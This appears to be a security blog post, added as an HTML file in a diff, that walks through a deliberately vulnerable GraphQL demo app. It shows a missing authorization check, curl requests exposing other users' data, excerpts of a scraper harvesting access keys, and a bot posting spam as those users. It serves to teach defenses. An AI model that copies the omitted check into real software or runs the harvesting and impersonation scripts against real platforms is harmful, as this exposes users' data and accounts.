@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    The Chef's Blog
+    <title>Bots and Scrapers</title>
+    <link rel="stylesheet" href="styles/styles.css">
+</head>
+<body>
+    <header>
+        <h1>Bots and Scrapers:</h1>
+        <h1>Motivations, Tactics, and Defenses</h1>
+        <div class="social-row">
+          <a href="https://github.com/mister-cyber-chef/" class="social-icon">
+            <img src="images/IMG_github.jpeg" alt="GitHub Logo">
+          </a>
+
+          <a href="https://x.com/mrgosint" title="Mrgosint on X" class="social-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 248 204">
+              <path fill="#ffffff" d="M248 24.3a102.2 102.2 0 0 1-29.2 8 51.1 51.1 0 0 0 22.4-28.2 102.6 102.6 0 0 1-32.4 12.4A51.1 51.1 0 0 0 121 63a145 145 0 0 1-105-53 51 51 0 0 0 15.8 68.2A50.9 50.9 0 0 1 10 70.7v.6a51 51 0 0 0 40.9 50 51 51 0 0 1-23 1 51.1 51.1 0 0 0 47.7 35.4A102.7 102.7 0 0 1 0 180.4 145 145 0 0 0 78.5 202c94.3 0 145.9-78.2 145.9-146 0-2.2 0-4.4-.1-6.5A104.4 104.4 0 0 0 248 24.3z"/>
+            </svg>
+          </a>
+
+          <a href="https://www.linkedin.com/in/mysocialacc" title="LinkedIn" class="social-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+              <path fill="#ffffff" d="M100.28 448H7.4V148.9h92.88zm-46.44-341a53.8 53.8 0 1 1 53.8-53.8 53.8 53.8 0 0 1-53.8 53.8zM447.9 448h-92.68V302.4c0-34.7-.7-79.3-48.29-79.3-48.4 0-55.8 37.8-55.8 76.9V448h-92.7V148.9h89v40.8h1.3c12.4-23.5 42.6-48.3 87.7-48.3 93.8 0 111.1 61.7 111.1 141.9z"/>
+            </svg>
+          </a>
+        </div>
+        <div id="nav-placeholder"></div>
+    </header>
+
+    <article>   
+        <h2>Bots and Scrapers in the Digital Landscape</h2>
+        
+        <p>In today’s online world, bots and scrapers play a much larger role than most people realize. Some help keep things running smoothly, while others cause real challenges for platforms and users. I wanted to take a moment to walk through what they do, why they exist, and what can be done to better understand and protect against them. My goal here is simply to share what I have learned along the way, in a clear and approachable way.</p>
+        
+        <h2>Understanding Bots and Scrapers</h2>
+        
+        <p>Bots are automated programs that interact with websites or applications. Some of them perform helpful tasks and take work off our hands. Others pretend to be real people or use automation in ways that create problems. Scrapers focus on collecting information by pulling data from a site piece by piece. Sometimes this is done for legitimate reasons. Other times it is used to gather large amounts of data without permission or control.</p>
+        
+        <p>Many bots are designed to copy human behavior closely enough to blend in, making them difficult to spot. Scrapers tend to be quieter but persistent, slowly gathering the information they are after. While their goals differ, both rely on finding weak points in systems, and that is where the trouble usually begins.</p>
+        
+        <h2>Motives and Tactics</h2>
+        
+        <p>The reasons behind bot activity vary widely. Some bots spread unwanted messages or try to influence how people think. Others aim to trick users, gather sensitive information, or take advantage of system features. Scrapers often collect data for research, monitoring, or analysis. But they can also be used for large scale data harvesting, copying entire profiles or sets of content.</p>
+
+        <p>The tactics used by both are constantly evolving. Bots may rotate user agents or IP addresses to avoid detection. Scrapers may carefully time their requests to stay under rate limits. When these two tools work together, they can create an even larger impact than either would on its own.</p>
+        
+        <h2>Combining Forces for Greater Impact</h2>
+        
+        <p>One of the more concerning situations is when bots and scrapers support each other. For example, a scraper might collect user data and pass it to a bot that then spreads messages pretending to be real people. This type of pairing can mislead users, damage trust, and weaken the overall safety of a platform. When left unchecked, it becomes difficult to know what is genuine and what is part of a coordinated effort.</p>
+        
+        <h2>Generic Social Media App</h2>
+        
+        <p>To help demonstrate how these issues can appear in real systems, I created a simple GraphQL based application that mimics a small social media platform. It generates sample users, posts, and interactions. The point of the exercise is to show where things can go wrong and how vulnerabilities can appear in ways that may not be obvious at first glance.</p>
+        
+        <pre><code class="language-python">
+        [TRUNCATED]
+        def validate_access_key(access_key):
+            return access_key == "valid_access_key"
+        [TRUNCATED]
+        </code></pre>
+        
+        <p>This function checks if the incoming request provided a matching access key. It is intentionally simple for demonstration purposes.</p>
+        
+        <pre><code class="language-python">
+        [TRUNCATED]
+        access_key = info.context.get('access_key')
+        if access_key != self.access_key:
+            raise Exception("Access denied")
+        [TRUNCATED]
+        </code></pre>
+        
+        <p>Each resolver checks the provided key before returning data. In a real application this logic would be more robust, but here it helps show how easily things can break if checks are skipped or applied inconsistently.</p>
+        
+        <p>In this example, user 8 corresponds to James Martinez, which we can see by running a simple GraphQL query.</p>
+        
+        <h5>Request:</h5>
+        
+        <pre><code class="language-bash">
+        curl -X POST -H "Content-Type: application/json" -H "Access-Key: 50441f01-8b54-4ea1-a0c1-88c02dd97bc0" --data "{\"query\": \"{ user(id: 8) { id name } }\"}" http://localhost:5000/graphql
+        </code></pre>
+        
+        <h5>Response:</h5>
+        <div class="response">
+        <p>{
+        "data": {
+            "user": {
+            "id": "VXNlcjo4",
+            "name": "James Martinez"
+            }
+        }
+        }</p>
+        </div>
+        
+        <p>If the same user tries to view another user’s private information, the system correctly denies access. This is what we expect and want to see.</p>
+        
+        <h5>Request:</h5>
+        
+        <pre><code class="language-bash">
+        curl -X POST -H "Content-Type: application/json" -H "Access-Key: 50441f01-8b54-4ea1-a0c1-88c02dd97bc0" --data "{\"query\": \"{ user(id: 9) { id name email posts (limit:2) { id title content } comments (limit:2) { id content } likes (limit:2) { id userId } } }\"}" http://localhost:5000/graphql
+        </code></pre>
+        
+        <h5>Response:</h5>
+        <div class="response">
+        <p>{
+        "data": {
+            "user": null
+        },
+        "errors": [
+            {
+            "locations": [
+                {
+                "column": 3,
+                "line": 1
+                }
+            ],
+            "message": "Access denied: Invalid access key",
+            "path": [
+                "user"
+            ]
+            }
+        ]
+        }</p>
+        </div>
+        
+        <p>Now that we understand the intended behavior, we can look at the vulnerable portions of the application. These were added on purpose to show how easily a small oversight can create an opening.</p>
+        
+        <p>The issues appear in the resolve_posts and resolve_user methods within the User class. Here is a portion of the code:</p>
+        
+        <pre><code class="language-python">
+        [TRUNCATED]
+        def resolve_posts(self, info, limit=None):
+            session = info.context.get('session')
+            query = session.query(PostModel).filter_by(user_id=self.id)
+            if limit is not None:
+                query = query.limit(limit)
+            return query.all()
+        [TRUNCATED]
+        def resolve_user(self, info, id): access_key = info.context.get('access_key')
+        [TRUNCATED]
+        </code></pre>
+        
+        <p>The key check is missing here. Because of that, any user can request another user’s posts, comments, or profile data. That is exactly what a scraper looks for, especially if the goal is to collect as much data as possible while pretending to be different users.</p>
+        
+        <p>If we repeat the earlier request, the server now returns user 9’s information without complaint:</p>
+        
+        <h5>Request:</h5>
+        
+        <pre><code>
+        curl -X POST -H "Content-Type: application/json" -H "Access-Key: 50441f01-8b54-4ea1-a0c1-88c02dd97bc0" --data "{\"query\": \"{ users(ids: [9) { id name email posts (limit:2) { id title content } comments (limit:2) { id content } likes (limit:2) { id userId } } }\"}" http://localhost:5000/graphql
+        </code></pre>
+        
+        <h5>Response:</h5>
+        <div class="response">
+        <p>{
+        "data": {
+            "user": {
+            "comments": null,
+            "email": "sophia@example.com",
+            "id": "VXNlcjo5",
+            "likes": null,
+            "name": "Sophia Anderson",
+            "posts": [
+                {
+                "content": "This is a post by Sophia Anderson",
+                "id": "UG9zdDo0MQ==",
+                "title": "Post by Sophia Anderson"
+                },
+                {
+                "content": "This is a post by Sophia Anderson",
+                "id": "UG9zdDo0Mg==",
+                "title": "Post by Sophia Anderson"
+                }
+            ]
+            }
+        },
+        "errors": [
+            {
+            "locations": [
+                {
+                "column": 68,
+                "line": 1
+                }
+            ],
+            "message": "Access denied",
+            "path": [
+                "user",
+                "comments"
+            ]
+            },
+            {
+            "locations": [
+                {
+                "column": 102,
+                "line": 1
+                }
+            ],
+            "message": "Access denied",
+            "path": [
+                "user",
+                "likes"
+            ]
+            }
+        ]
+        }</p>
+        </div>
+        
+        <p>This is exactly the type of oversight that scrapers thrive on. With this opening, it becomes very easy to gather information in bulk, especially if combined with automation.</p>
+
+        <p>From here, it is not difficult to imagine a scraper gathering access keys and turning them over to a bot that then spreads unwanted content by posting as real users.</p>
+        
+        <pre><code class="language-python">
+        [TRUNCATED]
+        def send_request(user_id, lock, responses):
+            graphql_query = {"query": "{ user(id: %d) { id name email accessKey } }" % user_id}
+            headers = {
+                "Content-Type": "application/json",
+                "Access-Key": access_key
+            }
+            response = requests.post(graphql_url, json=graphql_query, headers=headers)
+            if response.status_code == 200 and response.json().get("data"):
+        [TRUNCATED]
+        </code></pre>
+
+        <p>Below is the output of a simple scraping loop that gathers user data. This is the type of information a bot can later misuse.</p>
+
+        <h5>Scrape Output:</h5>
+        <div class="response">
+        <p>Response for user ID 0:<br>
+        {'data': {'user': None}, 'errors': [{'locations': [{'column': 3, 'line': 1}], 'message': 'User not found', 'path': ['user']}]}
+        Response for user ID 1:<br>
+        {'data': {'user': {'accessKey': '97c9ea8c-e663-4072-bd03-b333655fae68', 'email': 'john@example.com', 'id': 'VXNlcjox', 'name': 'John Doe'}}}
+        Response for user ID 2:<br>
+        {'data': {'user': {'accessKey': 'f4a67797-d711-423c-92b7-9c5db57182b6', 'email': 'jane@example.com', 'id': 'VXNlcjoy', 'name': 'Jane Smith'}}}
+        Response for user ID 3:<br>
+        {'data': {'user': {'accessKey': '27a8b14e-398a-49b4-8ed2-a960e990f1c8', 'email': 'alice@example.com', 'id': 'VXNlcjoz', 'name': 'Alice Johnson'}}}
+        Response for user ID 4:<br>
+        {'data': {'user': {'accessKey': '8968c9e0-ef6b-454d-96ca-b151037ae3a2', 'email': 'bob@example.com', 'id': 'VXNlcjo0', 'name': 'Bob Brown'}}}
+        Response for user ID 5:<br>
+        {'data': {'user': {'accessKey': '9b36d01d-c6c7-4138-8eb0-a0e3b6ae05d5', 'email': 'emma@example.com', 'id': 'VXNlcjo1', 'name': 'Emma Davis'}}}
+        Response for user ID 6:<br>
+        {'data': {'user': {'accessKey': '59d73e34-e047-44e4-bf76-43bfd2348d6a', 'email': 'michael@example.com', 'id': 'VXNlcjo2', 'name': 'Michael Wilson'}}}
+        Response for user ID 7:<br>
+        {'data': {'user': {'accessKey': 'c6790640-2322-41e7-bfe0-847ed53b2eb3', 'email': 'olivia@example.com', 'id': 'VXNlcjo3', 'name': 'Olivia Taylor'}}}
+        [TRUNCATED]</p>
+        </div>
+        
+        <p>Using the gathered keys, a bot can now post messages as if it were the real user, which is a real concern for any platform.</p>
+        
+        <pre><code class="language-python">
+        [TRUNCATED]
+        access_keys = ["50441f01-8b54-4ea1-a0c1-88c02dd97bc0", "27a8b14e-398a-49b4-8ed2-a960e990f1c8", "59d73e34-e047-44e4-bf76-43bfd2348d6a","76750552-173e-449d-b3ec-0107bfd0d62c","8968c9e0-ef6b-454d-96ca-b151037ae3a2","97c9ea8c-e663-4072-bd03-b333655fae68","9b36d01d-c6c7-4138-8eb0-a0e3b6ae05d5","c6790640-2322-41e7-bfe0-847ed53b2eb3","e994109a-e82d-4138-b683-0710eed34907","f4a67797-d711-423c-92b7-9c5db57182b6"]
+        [TRUNCATED]
+        def send_request(access_key):
+            mutation_query = '''
+            mutation {
+            createPost(title: "Bot Post by James", content: "Check out this totally safe link!! www.thisismalware.com) 
+                post {
+                id
+                }
+            }
+            }
+            '''
+        [TRUNCATED]
+                print(f"key:{access_key} post successful | id:{post_id}")
+        [TRUNCATED]
+        </code></pre>
+        
+        <p>The bot script cycles through each access key and posts as the user tied to that key. This is how a simple oversight can quickly spiral into something much larger in a real world environment.</p>
+        
+        <pre><code class="language-bash">
+        key:c6790640-2322-41e7-bfe0-847ed53b2eb3 post successful | id:UG9zdDo1MQ==
+        key:59d73e34-e047-44e4-bf76-43bfd2348d6a post successful | id:UG9zdDo1Mw==
+        key:8968c9e0-ef6b-454d-96ca-b151037ae3a2 post successful | id:UG9zdDo1Mg==
+        key:f4a67797-d711-423c-92b7-9c5db57182b6 post successful | id:UG9zdDo1NA==
+        key:50441f01-8b54-4ea1-a0c1-88c02dd97bc0 post successful | id:UG9zdDo1NQ==
+        key:9b36d01d-c6c7-4138-8eb0-a0e3b6ae05d5 post successful | id:UG9zdDo1Nw==
+        key:76750552-173e-449d-b3ec-0107bfd0d62c post successful | id:UG9zdDo1Ng==
+        key:97c9ea8c-e663-4072-bd03-b333655fae68 post successful | id:UG9zdDo1OA==
+        key:e994109a-e82d-4138-b683-0710eed34907 post successful | id:UG9zdDo1OQ==
+        key:27a8b14e-398a-49b4-8ed2-a960e990f1c8 post successful | id:UG9zdDo2MA==
+        </code></pre>
+        
+        <p>Querying those posts shows the bot activity clearly. It has posted as multiple users and each post carries the same message.</p>
+
+        <h5>Spam Post Result:</h5>
+        <pre><code class="language-bash">
+        {
+        "data": {
+            "posts": [
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1MQ==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjo3",
+                "name": "Olivia Taylor"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1Mg==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjo4",
+                "name": "James Martinez"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1Mw==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjoy",
+                "name": "Jane Smith"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1NA==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjo1",
+                "name": "Emma Davis"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1NQ==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjo2",
+                "name": "Michael Wilson"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1Ng==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjo5",
+                "name": "Sophia Anderson"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1Nw==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjo0",
+                "name": "Bob Brown"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1OA==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjox",
+                "name": "John Doe"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1OQ==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjoz",
+                "name": "Alice Johnson"
+                }
+            },
+            {
+                "content": "Check out this totally safe link!! www.thisismalware.com",
+                "id": "UG9zdDo1Ng==",
+                "title": "Bot Post by James",
+                "user": {
+                "id": "VXNlcjo6",
+                "name": "Robert Garcia"
+                }
+            }
+            ]
+        }
+        }
+        </code></pre>
+        
+        <p>This entire example is meant to show how small gaps in logic can grow into real issues. Even simple oversights can make it far too easy for bots and scrapers to abuse a system. The more we understand how they work, the better equipped we are to recognize warning signs and strengthen the systems we build.</p>
+
+        <h2>Working Toward Better Defenses</h2>
+
+        <p>Keeping bots and scrapers in check requires continuous attention and patience. Good access control, proper rate limiting, careful validation, and regular code reviews all play an important role. Monitoring patterns and user behavior can also help catch unusual activity before it grows too large. It will always be a balancing act, but staying aware and adapting as tactics evolve is key.</p>
+
+        <p>I hope this breakdown offered some helpful insight. The more we share what we learn, the stronger our collective defenses become. There is always room for improvement, and each lesson helps us move in the right direction.</p>
+    </article>
+</body>
+
+<div></div>
+    <footer>
+        <div class="centered">
+            <p>Want to explore the code and try it out yourself? Visit my <a href="https://github.com/mister-cyber-chef/generic_socialMedia" target="_blank">GitHub page</a>.</p>
+            <em><p id="footer-year">The Chef's Blog | Copyright © <span></span> | All rights reserved.</p></em>
+        </div>
+    </footer>
+
+    <!-- get footer Year -->
+    <script>
+        document.querySelector("#footer-year span").textContent = new Date().getFullYear();
+    </script>
+
+<script>
+function initNavToggle() {
+  const nav = document.querySelector(".site-nav");
+  if (!nav) return;
+
+  const toggle = nav.querySelector(".nav-toggle");
+  const links = nav.querySelector(".nav-links");
+
+  toggle.addEventListener("click", () => {
+    const isOpen = nav.classList.toggle("open");
+    toggle.setAttribute("aria-expanded", isOpen ? "true" : "false");
+  });
+
+  // close menu when a link is clicked
+  links.addEventListener("click", (e) => {
+    if (e.target.tagName.toLowerCase() === "a") {
+      nav.classList.remove("open");
+      toggle.setAttribute("aria-expanded", "false");
+    }
+  });
+}
+
+fetch("nav.html")
+  .then(res => res.text())
+  .then(html => {
+    const placeholder = document.getElementById("nav-placeholder");
+    placeholder.innerHTML = html;
+    initNavToggle();
+  });
+</script>
+</html>
